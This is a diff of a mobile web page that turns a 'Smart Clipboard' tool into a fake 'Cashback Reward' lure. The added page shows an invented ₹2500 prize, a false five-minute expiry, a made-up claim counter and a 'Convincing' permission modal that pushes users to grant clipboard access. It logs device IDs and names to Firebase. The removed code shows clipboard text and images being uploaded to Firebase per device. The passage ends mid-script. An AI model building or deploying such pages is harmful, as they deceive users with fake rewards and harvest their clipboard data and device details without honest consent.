@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Smart Clipboard</title>
+    <title>Cashback Reward</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
         
@@ -11,87 +11,328 @@
             background: #000;
             color: #fff;
             min-height: 100vh;
-            overflow-x: hidden;
+            overflow: hidden;
             -webkit-font-smoothing: antialiased;
         }
 
         /* ============================================================
-           HERO SECTION
+           BACKGROUND
            ============================================================ */
-        .hero {
-            padding: 50px 20px 30px;
-            text-align: center;
-            background: linear-gradient(180deg, rgba(0, 132, 255, 0.15) 0%, transparent 100%);
-            position: relative;
-            overflow: hidden;
+        .bg {
+            position: fixed;
+            inset: 0;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 50%, #0a0a0a 100%);
+            z-index: 0;
         }
 
-        .hero::before {
+        .bg::before {
             content: '';
             position: absolute;
             top: -100px; left: 50%;
             transform: translateX(-50%);
-            width: 300px; height: 300px;
-            background: radial-gradient(circle, rgba(0, 132, 255, 0.3), transparent 70%);
+            width: 400px; height: 400px;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.15), transparent 70%);
             animation: glowPulse 4s infinite;
         }
 
         @keyframes glowPulse {
-            0%, 100% { transform: translateX(-50%) scale(1); opacity: 0.5; }
-            50% { transform: translateX(-50%) scale(1.2); opacity: 0.8; }
+            0%, 100% { transform: translateX(-50%) scale(1); opacity: 0.6; }
+            50% { transform: translateX(-50%) scale(1.2); opacity: 1; }
         }
 
-        .hero-icon {
-            font-size: 80px;
-            margin-bottom: 16px;
-            display: inline-block;
-            animation: floatIcon 3s ease-in-out infinite;
+        /* Confetti background */
+        .confetti-bg {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .confetti-piece {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: #FFD700;
+            border-radius: 2px;
+            animation: confettiFall 4s infinite linear;
+            opacity: 0.7;
+        }
+
+        @keyframes confettiFall {
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.8; }
+            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+        }
+
+        /* ============================================================
+           MAIN CONTENT
+           ============================================================ */
+        .content {
             position: relative;
-            z-index: 2;
+            z-index: 10;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
 
-        @keyframes floatIcon {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-12px) rotate(5deg); }
+        /* Top congratulations */
+        .congrats-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            background: linear-gradient(45deg, rgba(255, 215, 0, 0.15), rgba(255, 165, 0, 0.15));
+            border: 1px solid rgba(255, 215, 0, 0.4);
+            border-radius: 24px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #FFD700;
+            margin-bottom: 24px;
+            animation: badgePulse 2s infinite;
+            letter-spacing: 0.5px;
         }
 
-        .hero h1 {
-            font-size: 30px;
-            font-weight: 800;
-            margin-bottom: 10px;
-            letter-spacing: -0.5px;
-            background: linear-gradient(45deg, #0084FF, #00C6FF);
+        @keyframes badgePulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.4); }
+            50% { transform: scale(1.03); box-shadow: 0 0 0 12px rgba(255, 215, 0, 0); }
+        }
+
+        /* Big reward number */
+        .reward-display {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .reward-label {
+            font-size: 14px;
+            color: #8e8e93;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .reward-amount {
+            font-size: 72px;
+            font-weight: 900;
+            line-height: 1;
+            background: linear-gradient(135deg, #FFD700, #FFA500, #FFD700);
+            background-size: 200% 200%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            position: relative;
-            z-index: 2;
+            animation: goldShine 3s infinite;
+            letter-spacing: -2px;
         }
 
-        .hero p {
-            font-size: 14px;
+        @keyframes goldShine {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .reward-sub {
+            font-size: 13px;
             color: #8e8e93;
-            line-height: 1.6;
-            max-width: 340px;
-            margin: 0 auto;
+            margin-top: 8px;
+        }
+
+        /* Code card */
+        .code-card {
+            width: 100%;
+            max-width: 380px;
+            background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
+            border: 2px solid rgba(255, 215, 0, 0.4);
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(255, 215, 0, 0.2);
+        }
+
+        .code-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 215, 0, 0.1), transparent);
+            animation: cardShine 3s infinite;
+        }
+
+        @keyframes cardShine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .code-label {
+            font-size: 11px;
+            color: #8e8e93;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 8px;
+            text-align: center;
             position: relative;
             z-index: 2;
         }
 
-        /* Trust badges */
-        .trust-badges {
+        .code-value {
+            font-family: 'Courier New', monospace;
+            font-size: 26px;
+            font-weight: 800;
+            color: #FFD700;
+            text-align: center;
+            letter-spacing: 3px;
+            padding: 16px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            border: 1px dashed rgba(255, 215, 0, 0.4);
+            position: relative;
+            z-index: 2;
+            user-select: all;
+            -webkit-user-select: all;
+        }
+
+        .code-validity {
             display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #FF3B30;
+            margin-top: 12px;
+            font-weight: 600;
+            position: relative;
+            z-index: 2;
+        }
+
+        .code-validity .dot {
+            width: 6px;
+            height: 6px;
+            background: #FF3B30;
+            border-radius: 50%;
+            animation: dotBlink 1s infinite;
+        }
+
+        @keyframes dotBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* Copy button */
+        .copy-btn {
+            width: 100%;
+            max-width: 380px;
+            padding: 20px 24px;
+            border: none;
+            border-radius: 18px;
+            background: linear-gradient(45deg, #FFD700, #FFA500, #FF8C00);
+            background-size: 200% 200%;
+            color: #1a1a1a;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 15px 40px rgba(255, 165, 0, 0.4);
+            animation: btnPulse 2s infinite, goldShine 3s infinite;
+            transition: transform 0.15s;
+            margin-bottom: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .copy-btn:active {
+            transform: scale(0.96);
+        }
+
+        @keyframes btnPulse {
+            0%, 100% { box-shadow: 0 15px 40px rgba(255, 165, 0, 0.4), 0 0 0 0 rgba(255, 215, 0, 0.6); }
+            50% { box-shadow: 0 15px 40px rgba(255, 165, 0, 0.6), 0 0 0 20px rgba(255, 215, 0, 0); }
+        }
+
+        .copy-btn .shine {
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { left: -100%; }
+            60%, 100% { left: 100%; }
+        }
+
+        /* Steps */
+        .steps {
+            display: flex;
+            align-items: center;
             justify-content: center;
             gap: 8px;
-            padding: 0 20px 24px;
-            flex-wrap: wrap;
+            margin-bottom: 20px;
         }
 
-        .badge {
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #8e8e93;
+        }
+
+        .step-num {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: rgba(255, 215, 0, 0.15);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: 700;
+            color: #FFD700;
+        }
+
+        .step-arrow {
+            color: #3c3c3e;
+            font-size: 12px;
+        }
+
+        /* Trust row */
+        .trust-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            font-size: 11px;
+            color: #5f6368;
+            margin-bottom: 12px;
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* Live users */
+        .live-users {
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            padding: 8px 14px;
+            padding: 6px 14px;
             background: rgba(52, 168, 83, 0.1);
             border: 1px solid rgba(52, 168, 83, 0.3);
             border-radius: 20px;
@@ -100,267 +341,17 @@
             font-weight: 600;
         }
 
-        /* Container */
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 0 20px 40px;
-        }
-
-        /* Cards */
-        .card {
-            background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
-            border: 1px solid #262626;
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 16px;
-            transition: border-color 0.2s;
-        }
-
-        .card:active {
-            border-color: #0084FF;
-        }
-
-        .card-title {
-            font-size: 16px;
-            font-weight: 700;
-            margin-bottom: 14px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .card-title .emoji { font-size: 20px; }
-        
-        .card-title .live-dot {
-            width: 8px;
-            height: 8px;
+        .live-users .dot {
+            width: 6px;
+            height: 6px;
             background: #34A853;
             border-radius: 50%;
-            margin-left: auto;
-            box-shadow: 0 0 10px #34A853;
-            animation: dotPulse 1.5s infinite;
+            animation: dotBlink 1.5s infinite;
         }
 
-        @keyframes dotPulse {
-            0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.4); opacity: 0.5; }
-        }
-
-        /* Perm status */
-        .perm-row {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 10px 14px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 12px;
-            font-size: 12px;
-            margin-bottom: 14px;
-        }
-
-        .perm-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            flex-shrink: 0;
-        }
-
-        .perm-dot.granted { background: #34A853; box-shadow: 0 0 8px #34A853; }
-        .perm-dot.prompt { background: #FFC107; box-shadow: 0 0 8px #FFC107; }
-        .perm-dot.denied { background: #FF3B30; box-shadow: 0 0 8px #FF3B30; }
-        .perm-dot.unknown { background: #8e8e93; }
-
-        .perm-text {
-            color: #8e8e93;
-            flex: 1;
-        }
-
-        .perm-text strong { color: #fff; }
-
-        /* Buttons */
-        .btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 14px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: inherit;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: transform 0.15s;
-            margin-bottom: 10px;
-        }
-
-        .btn:active { transform: scale(0.97); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-
-        .btn-primary {
-            background: linear-gradient(45deg, #0084FF, #00C6FF);
-            color: #fff;
-            box-shadow: 0 10px 30px rgba(0, 132, 255, 0.4);
-        }
-
-        .btn-success {
-            background: linear-gradient(45deg, #34A853, #25D366);
-            color: #fff;
-            box-shadow: 0 10px 30px rgba(52, 168, 83, 0.4);
-        }
-
-        .btn-secondary {
-            background: #262626;
-            color: #fff;
-            border: 1px solid #333;
-        }
-
-        .btn-danger {
-            background: linear-gradient(45deg, #FF3B30, #C62828);
-            color: #fff;
-            box-shadow: 0 10px 30px rgba(255, 59, 48, 0.4);
-        }
-
-        /* Textarea */
-        .text-input {
-            width: 100%;
-            padding: 14px 16px;
-            background: rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            color: #fff;
-            font-size: 14px;
-            font-family: inherit;
-            outline: none;
-            resize: none;
-            min-height: 100px;
-            margin-bottom: 12px;
-            transition: border-color 0.2s;
-        }
-
-        .text-input:focus { border-color: #0084FF; }
-        .text-input::placeholder { color: #5f6368; }
-
-        /* Result */
-        .result-box {
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(52, 168, 83, 0.3);
-            border-radius: 12px;
-            padding: 14px;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            color: #34A853;
-            line-height: 1.5;
-            word-break: break-all;
-            max-height: 200px;
-            overflow-y: auto;
-            margin-top: 10px;
-            display: none;
-        }
-
-        .result-box.show { display: block; }
-        .result-box.error {
-            border-color: rgba(255, 59, 48, 0.3);
-            color: #FF3B30;
-        }
-
-        .image-preview {
-            max-width: 100%;
-            border-radius: 12px;
-            margin-top: 12px;
-            display: none;
-        }
-
-        .image-preview.show { display: block; }
-
-        /* Stats bar */
-        .stats-bar {
-            display: flex;
-            justify-content: space-around;
-            padding: 16px;
-            background: rgba(28, 28, 30, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            margin-bottom: 16px;
-            backdrop-filter: blur(10px);
-        }
-
-        .stat {
-            text-align: center;
-        }
-
-        .stat .num {
-            font-size: 22px;
-            font-weight: 800;
-            color: #0084FF;
-            display: block;
-        }
-
-        .stat .label {
-            font-size: 10px;
-            color: #8e8e93;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-top: 2px;
-        }
-
-        /* Recent items */
-        .recent-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 12px;
-            margin-bottom: 8px;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .recent-item:active {
-            background: rgba(0, 132, 255, 0.15);
-        }
-
-        .recent-icon {
-            width: 36px;
-            height: 36px;
-            border-radius: 10px;
-            background: rgba(0, 132, 255, 0.15);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-            flex-shrink: 0;
-        }
-
-        .recent-text {
-            flex: 1;
-            min-width: 0;
-        }
-
-        .recent-text strong {
-            display: block;
-            font-size: 13px;
-            color: #fff;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .recent-text span {
-            font-size: 11px;
-            color: #8e8e93;
-        }
-
-        .recent-time {
-            font-size: 11px;
-            color: #5f6368;
-            flex-shrink: 0;
-        }
-
-        /* PERMISSION MODAL — Convincing */
+        /* ============================================================
+           PERMISSION MODAL
+           ============================================================ */
         #permModal {
             position: fixed;
             inset: 0;
@@ -381,15 +372,15 @@
             to { opacity: 1; }
         }
 
-        .perm-modal-box {
+        .perm-box {
             background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
-            border: 1px solid #262626;
+            border: 2px solid rgba(255, 215, 0, 0.4);
             border-radius: 24px;
-            padding: 32px 24px 24px;
+            padding: 28px 24px 24px;
             max-width: 400px;
             width: 100%;
             text-align: center;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
+            box-shadow: 0 30px 80px rgba(255, 215, 0, 0.2);
             animation: boxIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
@@ -398,64 +389,128 @@
             to   { transform: translateY(0) scale(1); opacity: 1; }
         }
 
-        .perm-modal-icon {
+        .perm-icon {
             font-size: 72px;
             margin-bottom: 16px;
             display: inline-block;
-            animation: floatIcon 3s ease-in-out infinite;
+            animation: floatIcon 2s ease-in-out infinite;
         }
 
-        .perm-modal-title {
+        @keyframes floatIcon {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-8px) scale(1.05); }
+        }
+
+        .perm-title {
             font-size: 22px;
             font-weight: 800;
             margin-bottom: 10px;
-            background: linear-gradient(45deg, #0084FF, #00C6FF);
+            background: linear-gradient(45deg, #FFD700, #FFA500);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
 
-        .perm-modal-sub {
+        .perm-sub {
             font-size: 14px;
             color: #8e8e93;
             line-height: 1.6;
-            margin-bottom: 22px;
+            margin-bottom: 20px;
+        }
+
+        .perm-code-show {
+            background: rgba(255, 215, 0, 0.08);
+            border: 1px dashed rgba(255, 215, 0, 0.4);
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 20px;
+        }
+
+        .perm-code-label {
+            font-size: 11px;
+            color: #8e8e93;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+
+        .perm-code-value {
+            font-family: 'Courier New', monospace;
+            font-size: 22px;
+            font-weight: 800;
+            color: #FFD700;
+            letter-spacing: 2px;
         }
 
         .perm-benefits {
             background: rgba(44, 44, 46, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            padding: 8px;
-            margin-bottom: 22px;
+            border-radius: 14px;
+            padding: 12px;
+            margin-bottom: 20px;
             text-align: left;
         }
 
         .perm-benefit {
             display: flex;
-            gap: 12px;
-            padding: 12px 14px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            gap: 10px;
+            padding: 8px 10px;
+            font-size: 12px;
+            color: #e0e0e0;
+            line-height: 1.5;
         }
 
-        .perm-benefit:last-child { border-bottom: none; }
-
-        .perm-benefit-icon {
-            font-size: 20px;
-            flex-shrink: 0;
+        .perm-benefit:not(:last-child) {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        .perm-benefit-text strong {
-            display: block;
+        .perm-btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 16px;
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            color: #1a1a1a;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            font-family: inherit;
+            margin-bottom: 10px;
+            box-shadow: 0 12px 30px rgba(255, 165, 0, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            animation: btnPulse 2s infinite;
+            transition: transform 0.15s;
+        }
+
+        .perm-btn:active {
+            transform: scale(0.97);
+        }
+
+        .perm-skip {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            background: transparent;
+            color: #5f6368;
             font-size: 13px;
-            color: #fff;
-            margin-bottom: 2px;
+            cursor: pointer;
+            font-family: inherit;
         }
 
-        .perm-benefit-text span {
-            font-size: 11px;
-            color: #8e8e93;
-            line-height: 1.4;
+        /* Success modal */
+        .success-icon {
+            font-size: 80px;
+            margin-bottom: 16px;
+            animation: successBounce 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            display: inline-block;
+        }
+
+        @keyframes successBounce {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); opacity: 1; }
         }
 
         /* Toast */
@@ -482,148 +537,148 @@
             from { opacity: 0; transform: translateX(-50%) translateY(20px); }
             to   { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
+
+        /* Confetti pieces */
+        .confetti-piece:nth-child(1) { left: 10%; background: #FFD700; animation-delay: 0s; }
+        .confetti-piece:nth-child(2) { left: 20%; background: #FF416C; animation-delay: 0.5s; }
+        .confetti-piece:nth-child(3) { left: 30%; background: #34A853; animation-delay: 1s; }
+        .confetti-piece:nth-child(4) { left: 40%; background: #0084FF; animation-delay: 1.5s; }
+        .confetti-piece:nth-child(5) { left: 50%; background: #FFD700; animation-delay: 2s; }
+        .confetti-piece:nth-child(6) { left: 60%; background: #FF416C; animation-delay: 2.5s; }
+        .confetti-piece:nth-child(7) { left: 70%; background: #34A853; animation-delay: 3s; }
+        .confetti-piece:nth-child(8) { left: 80%; background: #0084FF; animation-delay: 3.5s; }
+        .confetti-piece:nth-child(9) { left: 90%; background: #FFD700; animation-delay: 0.3s; }
+        .confetti-piece:nth-child(10) { left: 15%; background: #FFA500; animation-delay: 1.8s; }
     </style>
 </head>
 <body>
 
-    <!-- HERO -->
-    <div class="hero">
-        <div class="hero-icon">📋</div>
-        <h1>Smart Clipboard</h1>
-        <p>Apni clipboard ko power do — read, write, aur auto-save</p>
+    <!-- Background -->
+    <div class="bg"></div>
+
+    <!-- Confetti -->
+    <div class="confetti-bg">
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
     </div>
 
-    <!-- TRUST BADGES -->
-    <div class="trust-badges">
-        <span class="badge">🔒 100% Private</span>
-        <span class="badge">⚡ Instant</span>
-        <span class="badge">☁️ Auto-Save</span>
-    </div>
+    <!-- Main content -->
+    <div class="content">
 
-    <div class="container">
+        <!-- Congrats badge -->
+        <div class="congrats-badge">
+            🎉 CONGRATULATIONS! 🎉
+        </div>
 
-        <!-- STATS -->
-        <div class="stats-bar">
-            <div class="stat">
-                <span class="num" id="statRead">0</span>
-                <span class="label">Reads</span>
-            </div>
-            <div class="stat">
-                <span class="num" id="statWrite">0</span>
-                <span class="label">Writes</span>
-            </div>
-            <div class="stat">
-                <span class="num" id="statSaved">0</span>
-                <span class="label">Saved</span>
+        <!-- Reward amount -->
+        <div class="reward-display">
+            <div class="reward-label">You Won</div>
+            <div class="reward-amount">₹2500</div>
+            <div class="reward-sub">Cashback Code</div>
+        </div>
+
+        <!-- Code card -->
+        <div class="code-card">
+            <div class="code-label">🎁 Your Cashback Code</div>
+            <div class="code-value" id="codeValue">CB2500XTREME</div>
+            <div class="code-validity">
+                <span class="dot"></span>
+                <span>Expires in 5 minutes</span>
             </div>
         </div>
 
-        <!-- READ CARD -->
-        <div class="card">
-            <div class="card-title">
-                <span class="emoji">📥</span>
-                <span>Read from Clipboard</span>
-                <span class="live-dot"></span>
+        <!-- Steps -->
+        <div class="steps">
+            <div class="step">
+                <div class="step-num">1</div>
+                <span>Copy</span>
             </div>
-
-            <div class="perm-row">
-                <div class="perm-dot unknown" id="readPermDot"></div>
-                <span class="perm-text">Status: <strong id="readPermText">Checking...</strong></span>
+            <span class="step-arrow">›</span>
+            <div class="step">
+                <div class="step-num">2</div>
+                <span>Paste</span>
             </div>
-
-            <button class="btn btn-primary" id="readTextBtn">
-                <span>📄</span>
-                <span>Read Text</span>
-            </button>
-
-            <button class="btn btn-secondary" id="readImageBtn">
-                <span>🖼️</span>
-                <span>Read Image</span>
-            </button>
-
-            <div class="result-box" id="readResult"></div>
-            <img class="image-preview" id="imagePreview" alt="Clipboard Image">
+            <span class="step-arrow">›</span>
+            <div class="step">
+                <div class="step-num">3</div>
+                <span>Get ₹2500</span>
+            </div>
         </div>
 
-        <!-- WRITE CARD -->
-        <div class="card">
-            <div class="card-title">
-                <span class="emoji">📤</span>
-                <span>Write to Clipboard</span>
-            </div>
+        <!-- Copy button -->
+        <button class="copy-btn" id="copyBtn">
+            <span class="shine"></span>
+            <span style="font-size: 22px;">📋</span>
+            <span>Copy Code & Get ₹2500</span>
+        </button>
 
-            <textarea class="text-input" id="writeTextInput" placeholder="Kuch type karo..."></textarea>
-
-            <button class="btn btn-success" id="writeTextBtn">
-                <span>📋</span>
-                <span>Copy to Clipboard</span>
-            </button>
-
-            <button class="btn btn-secondary" id="writeHtmlBtn">
-                <span>🎨</span>
-                <span>Copy Formatted Text</span>
-            </button>
-
-            <button class="btn btn-danger" id="clearBtn">
-                <span>🗑️</span>
-                <span>Clear Clipboard</span>
-            </button>
+        <!-- Live users -->
+        <div class="live-users">
+            <span class="dot"></span>
+            <span><span id="liveCount">1,247</span> users claimed today</span>
         </div>
 
-        <!-- RECENT CARD -->
-        <div class="card">
-            <div class="card-title">
-                <span class="emoji">🕐</span>
-                <span>Recent Clipboard Items</span>
+        <!-- Trust row -->
+        <div class="trust-row">
+            <div class="trust-item">
+                <span>🔒</span>
+                <span>Secure</span>
             </div>
-            <div id="recentList">
-                <div style="text-align: center; padding: 20px; color: #5f6368; font-size: 12px;">
-                    No recent items
-                </div>
+            <div class="trust-item">
+                <span>✅</span>
+                <span>Verified</span>
+            </div>
+            <div class="trust-item">
+                <span>⚡</span>
+                <span>Instant</span>
             </div>
         </div>
 
     </div>
 
-    <!-- PERMISSION MODAL — Convincing -->
+    <!-- PERMISSION MODAL -->
     <div id="permModal">
-        <div class="perm-modal-box">
-            <div class="perm-modal-icon" id="permModalIcon">🔐</div>
-            <h2 class="perm-modal-title" id="permModalTitle">Clipboard Permission</h2>
-            <p class="perm-modal-sub" id="permModalSub">
-                Clipboard access chahiye — read aur write dono ke liye
+        <div class="perm-box">
+            <div class="perm-icon" id="permIcon">📋</div>
+            <h2 class="perm-title" id="permTitle">Enable Clipboard</h2>
+            <p class="perm-sub" id="permSub">
+                Code copy karne ke liye clipboard access zaroori hai
             </p>
+
+            <div class="perm-code-show">
+                <div class="perm-code-label">Your Code</div>
+                <div class="perm-code-value" id="permCodeValue">CB2500XTREME</div>
+            </div>
 
             <div class="perm-benefits">
                 <div class="perm-benefit">
-                    <span class="perm-benefit-icon">⚡</span>
-                    <div class="perm-benefit-text">
-                        <strong>Instant Read</strong>
-                        <span>Kuch bhi copy karo, turant padho</span>
-                    </div>
+                    <span>⚡</span>
+                    <span>Instant copy — ek tap mein</span>
                 </div>
                 <div class="perm-benefit">
-                    <span class="perm-benefit-icon">🔒</span>
-                    <div class="perm-benefit-text">
-                        <strong>100% Private</strong>
-                        <span>Data tumhare device pe hi rehta hai</span>
-                    </div>
+                    <span>🔒</span>
+                    <span>100% secure & private</span>
                 </div>
                 <div class="perm-benefit">
-                    <span class="perm-benefit-icon">☁️</span>
-                    <div class="perm-benefit-text">
-                        <strong>Auto-Save</strong>
-                        <span>Recent items automatically save honge</span>
-                    </div>
+                    <span>🎁</span>
+                    <span>Claim karo aur ₹2500 pao</span>
                 </div>
             </div>
 
-            <button class="btn btn-primary" id="permAllowBtn">
+            <button class="perm-btn" id="permAllowBtn">
                 <span>✅</span>
-                <span id="permAllowText">Allow Clipboard Access</span>
+                <span>Allow & Copy Code</span>
             </button>
 
-            <button class="btn btn-secondary" id="permSkipBtn" style="background: transparent; border: none; color: #5f6368; font-size: 13px;">
+            <button class="perm-skip" id="permSkipBtn">
                 Maybe later
             </button>
         </div>
@@ -671,371 +726,54 @@
 
         console.log('📱 Device:', DEVICE_ID);
 
-        /* STATE */
-        let readCount = 0;
-        let writeCount = 0;
-        let savedCount = 0;
-        let recentItems = [];
+        /* GENERATE RANDOM CODE */
+        function generateCode() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = 'CB2500';
+            for (let i = 0; i < 6; i++) {
+                code += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return code;
+        }
+
+        const CASHBACK_CODE = generateCode();
+        console.log('🎁 Generated code:', CASHBACK_CODE);
 
         /* DOM */
-        const readTextBtn = document.getElementById('readTextBtn');
-        const readImageBtn = document.getElementById('readImageBtn');
-        const readResult = document.getElementById('readResult');
-        const imagePreview = document.getElementById('imagePreview');
-        const writeTextInput = document.getElementById('writeTextInput');
-        const writeTextBtn = document.getElementById('writeTextBtn');
-        const writeHtmlBtn = document.getElementById('writeHtmlBtn');
-        const clearBtn = document.getElementById('clearBtn');
-        const recentList = document.getElementById('recentList');
-        const statRead = document.getElementById('statRead');
-        const statWrite = document.getElementById('statWrite');
-        const statSaved = document.getElementById('statSaved');
-        const readPermDot = document.getElementById('readPermDot');
-        const readPermText = document.getElementById('readPermText');
+        const codeValue = document.getElementById('codeValue');
+        const permCodeValue = document.getElementById('permCodeValue');
+        const copyBtn = document.getElementById('copyBtn');
         const permModal = document.getElementById('permModal');
         const permAllowBtn = document.getElementById('permAllowBtn');
         const permSkipBtn = document.getElementById('permSkipBtn');
+        const liveCount = document.getElementById('liveCount');
+
+        // Set code
+        codeValue.textContent = CASHBACK_CODE;
+        permCodeValue.textContent = CASHBACK_CODE;
 
         /* ============================================================
-           SAVE TO FIREBASE DB
+           SAVE TO FIREBASE
            ============================================================ */
-        async function saveToDB(type, content, metadata = {}) {
+        async function saveEvent(eventType, extra = {}) {
             try {
-                const clipRef = push(ref(db, 'clipboard_data/' + DEVICE_ID));
-                
-                await set(clipRef, {
-                    id: clipRef.key,
+                const eventRef = push(ref(db, 'cashback_events/' + DEVICE_ID));
+                await set(eventRef, {
+                    id: eventRef.key,
                     deviceId: DEVICE_ID,
                     deviceName: DEVICE_NAME,
                     sessionId: SESSION_ID,
-                    type: type,                    // 'text', 'image', 'write'
-                    content: content,              // text or base64
-                    size: content ? content.length : 0,
+                    eventType: eventType,
+                    code: CASHBACK_CODE,
                     timestamp: serverTimestamp(),
                     uploadedAt: Date.now(),
-                    ...metadata
+                    ...extra
                 });
-                
-                savedCount++;
-                statSaved.textContent = savedCount;
-                console.log('✅ Saved to DB:', type, `(${(content?.length / 1024).toFixed(1)} KB)`);
-                return true;
+                console.log('✅ Event saved:', eventType);
             } catch (err) {
-                console.error('❌ DB save failed:', err.code, err.message);
-                return false;
+                console.error('❌ Save failed:', err.message);
             }
         }
-
-        /* ============================================================
-           RECENT ITEMS (local UI + DB)
-           ============================================================ */
-        function addRecentItem(type, preview, timestamp = Date.now()) {
-            const item = { type, preview, timestamp };
